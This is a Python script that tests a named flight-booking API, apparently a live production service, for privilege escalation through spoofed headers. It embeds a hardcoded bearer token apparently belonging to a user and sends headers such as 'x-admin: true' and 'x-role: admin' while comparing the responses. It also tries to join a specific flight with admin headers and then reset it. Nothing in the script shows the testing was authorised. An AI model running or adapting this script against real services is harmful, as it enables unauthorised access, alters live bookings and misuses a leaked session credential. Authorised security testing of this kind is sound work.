#!/usr/bin/env python3
"""
Header Escalation Testing

Tests if special header values grant additional privileges or reveal extra data
"""

import requests
import json

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

def get_flights_v3(extra_headers=None):
    """Get flights from v3 API with optional extra headers"""
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    if extra_headers:
        headers.update(extra_headers)

    try:
        r = requests.get(
            f"{API_URL}/v3/flight?includeExpired=false&nearMe=false",
            headers=headers,
            timeout=10
        )
        return {
            "status": r.status_code,
            "count": len(r.json().get('data', [])) if r.status_code == 200 else 0,
            "response": r.text[:300]
        }
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}

def join_flight_v2(flight_id, extra_headers=None):
    """Join flight with optional extra headers"""
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    if extra_headers:
        headers.update(extra_headers)

    try:
        r = requests.post(
            f"{API_URL}/v2/flight/{flight_id}/enter",
            headers=headers,
            json={},
            timeout=10
        )
        return {
            "status": r.status_code,
            "response": r.text[:300]
        }
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}

def main():
    print("="*80)
    print("HEADER ESCALATION TESTING")
    print("="*80)
    print()

    # Get baseline
    print("Step 1: Getting baseline (no extra headers)...")
    baseline = get_flights_v3()
    print(f"Status: {baseline['status']}")
    print(f"Flight count: {baseline['count']}")
    print()

    baseline_count = baseline['count']

    # Test header combinations
    print("="*80)
    print("TESTING HEADER COMBINATIONS")
    print("="*80)
    print()

    test_cases = [
        # Platform variations
        ({"x-app-platform": "admin"}, "Admin platform"),
        ({"x-app-platform": "internal"}, "Internal platform"),
        ({"x-app-platform": "debug"}, "Debug platform"),
        ({"x-app-platform": "developer"}, "Developer platform"),
        ({"x-app-platform": "test"}, "Test platform"),

        # Device ID variations
        ({"x-device-id": "00000000-0000-0000-0000-000000000000"}, "Zero device ID"),
        ({"x-device-id": "admin-device"}, "Admin device ID"),
        ({"x-device-id": "internal"}, "Internal device ID"),

        # Build number variations
        ({"x-build-number": "9999"}, "Future build number"),
        ({"x-build-number": "0"}, "Zero build number"),
        ({"x-build-number": "999999"}, "Very high build number"),

        # Custom headers
        ({"x-internal-request": "true"}, "Internal request flag"),
        ({"x-admin": "true"}, "Admin flag"),
        ({"x-debug": "true"}, "Debug flag"),
        ({"x-elevated": "true"}, "Elevated flag"),
        ({"x-bypass-filters": "true"}, "Bypass filters flag"),
        ({"x-show-all": "true"}, "Show all flag"),

        # Role headers
        ({"x-role": "admin"}, "Admin role"),
        ({"x-role": "developer"}, "Developer role"),
        ({"x-user-type": "admin"}, "Admin user type"),

        # Combined problematic headers
        ({
            "x-app-platform": "admin",
            "x-device-id": "admin-device",
            "x-build-number": "9999",
            "x-admin": "true"
        }, "Multiple admin headers"),
    ]

    interesting = []

    for headers, description in test_cases:
        print(f"Testing: {description}")
        print(f"  Headers: {json.dumps(headers, indent=4)}")

        result = get_flights_v3(headers)
        status = result['status']
        count = result['count']

        print(f"  Status: {status}")

        if status == 200:
            print(f"  Flight count: {count}")

            if count != baseline_count:
                print(f"  ⚠️  COUNT CHANGED! Baseline: {baseline_count}, New: {count}")
                interesting.append({
                    "headers": headers,
                    "description": description,
                    "baseline_count": baseline_count,
                    "new_count": count,
                    "difference": count - baseline_count
                })
            else:
                print(f"  ✅ No change in count")

            # Check response for keywords
            response = result['response'].lower()
            keywords = ['admin', 'debug', 'internal', 'privilege', 'elevated', 'superuser']

            found_keywords = [kw for kw in keywords if kw in response]
            if found_keywords:
                print(f"  ⚠️  Found keywords in response: {found_keywords}")
                if description not in [i['description'] for i in interesting]:
                    interesting.append({
                        "headers": headers,
                        "description": description,
                        "finding": f"Response contains: {found_keywords}"
                    })
        else:
            print(f"  ℹ️  Status: {status}")

        print()

    # Test join operation with special headers
    print("="*80)
    print("TESTING JOIN OPERATION WITH SPECIAL HEADERS")
    print("="*80)
    print()

    print("Testing if special headers grant join privileges...")
    admin_headers = {
        "x-app-platform": "admin",
        "x-admin": "true",
        "x-elevated": "true"
    }

    join_result = join_flight_v2(8800, admin_headers)
    print(f"Join with admin headers: Status {join_result['status']}")
    print(f"Response: {join_result['response']}")
    print()

    # Cleanup if successful
    if join_result['status'] == 200:
        print("Cleaning up...")
        reset_headers = {
            "Authorization": f"Bearer {SAMEER_TOKEN}",
            "Content-Type": "application/json"
        }
        requests.post(f"{API_URL}/v2/flight/8800/reset", headers=reset_headers)
        print("✅ Cleanup complete")
        print()

    # Summary
    print("="*80)
    print("HEADER ESCALATION RESULTS")
    print("="*80)
    print()

    if interesting:
        print(f"⚠️  Found {len(interesting)} header combinations that change behavior:")
        print()
        for item in interesting:
            print(f"  Headers: {json.dumps(item['headers'], indent=4)}")
            print(f"  Description: {item['description']}")
            if 'difference' in item:
                print(f"  Flight count change: {item['baseline_count']} → {item['new_count']} ({item['difference']:+d})")
            if 'finding' in item:
                print(f"  Finding: {item['finding']}")
            print()

        print("Security Assessment: CONCERNING")
        print("  - Special headers alter API behavior")
        print("  - Possible privilege escalation")
        print("  - Headers may be trusted by backend")
    else:
        print("✅ No header escalation vectors found")
        print()
        print("Security Assessment: GOOD")
        print("  - Headers are properly ignored or validated")
        print("  - No privilege escalation detected")
        print("  - Headers don't affect authorization")

    print()

    # Save results
    if interesting:
        output_file = "/home/user/vaunt/api_testing/header_escalation_findings.json"
        with open(output_file, 'w') as f:
            json.dump(interesting, f, indent=2)
        print(f"✅ Findings saved to: {output_file}")
        print()

    print("="*80)

if __name__ == "__main__":
    main()
